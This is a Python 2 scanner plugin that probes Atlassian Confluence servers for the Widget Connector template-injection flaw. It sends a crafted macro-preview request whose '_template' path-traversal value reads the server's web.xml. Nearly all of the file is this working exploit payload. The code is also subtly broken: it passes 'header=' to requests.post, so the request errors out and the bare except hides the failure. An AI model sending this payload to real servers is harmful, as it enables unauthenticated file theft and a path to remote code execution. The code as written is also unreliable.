# coding:utf-8

import requests

def get_plugin_info():
    plugin_info = {
        "name": "Atlassian Confluence Widget Connector macro 远程代码执行",
        "info": "Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者无需登录即可利用此漏洞读取服务器任意文件与远程代码执行",
        "level": "紧急",
        "type": "RCE",
        "author": "taro",
        "url": "https://paper.seebug.org/884/",
        "keyword": "all:confluence",
        "source": 1
    }
    return plugin_info

def check(host, port, timeout):
    data = '{"contentId":"123","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/123","width":"10","height":"10","_template":"../web.xml"}}}'
    u = "http://%s:%d/" % (host, int(port))
    url = u + "/rest/tinymce/1/macro/preview"
    header_list = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
        'Content-Type':'application/json',
        'Referer': u + '/pages/resumedraft.action?draftId=123&draftShareId=123&'
    }
    try:
        res = requests.post(url=url, data=data, header=header_list ,timeout=timeout)
        res.encoding = 'utf-8'
        resp_text = res.text
        if '<param-name>contextConfigLocation</param-name>' in resp_text:
            info = '存在远程代码执行: ' + url
            return info
    except Exception, e:
        pass
